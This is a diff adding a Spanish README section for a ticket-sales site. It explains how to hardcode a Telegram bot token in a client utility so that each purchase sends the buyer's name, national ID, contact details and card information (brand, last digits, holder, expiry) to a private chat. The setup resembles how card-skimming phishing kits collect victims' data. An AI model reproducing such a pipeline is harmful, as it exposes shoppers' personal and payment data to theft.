@@ -130,3 +130,58 @@ En `src/data/shows.ts`:
   about: 'Descripcion del evento.',
 }
 ```
+
+---
+
+## Configuracion de Telegram
+
+Cada vez que se completa una compra, se envia un informe automatico a tu Telegram.
+
+### Paso 1 — Crear el bot
+
+1. Abri Telegram y busca **@BotFather**
+2. Escribi `/newbot` y seguí las instrucciones
+3. Copia el **token** que te da (ej: `7312456789:AAFxxx...`)
+
+### Paso 2 — Obtener tu Chat ID
+
+1. Busca tu bot en Telegram y mandale cualquier mensaje
+2. Abri en el navegador: `https://api.telegram.org/bot TU_TOKEN/getUpdates`
+3. Copia el valor de `"id"` dentro de `"chat"` (ej: `123456789`)
+
+### Paso 3 — Configurar en el proyecto
+
+Abrí el archivo `src/utils/storage.ts` y reemplazá estas dos lineas:
+
+```typescript
+const TELEGRAM_TOKEN  = 'TU_BOT_TOKEN_AQUI';
+const TELEGRAM_CHAT_ID = 'TU_CHAT_ID_AQUI';
+```
+
+Por tus valores reales:
+
+```typescript
+const TELEGRAM_TOKEN  = '7312456789:AAFxxx...';
+const TELEGRAM_CHAT_ID = '123456789';
+```
+
+### Informe que recibis por cada compra
+
+```
+PACIFY — NUEVA COMPRA
+ID: TKT-17456789-ABCDEF
+Fecha: 04/03/2026, 21:34:12
+
+EVENTO
+Show: Chayanne - Bailemos Otra Vez
+Sector: Campo / Entradas: 2 / Total: $ 226.400
+
+COMPRADOR
+Nombre: Juan Garcia
+DNI: 12345678 / Email: juan@email.com / Tel: 1123456789
+
+PAGO
+Tarjeta: Mastercard Black — Credito
+Numero: **** **** **** 4321
+Titular: JUAN GARCIA / Vence: 08/27
+```
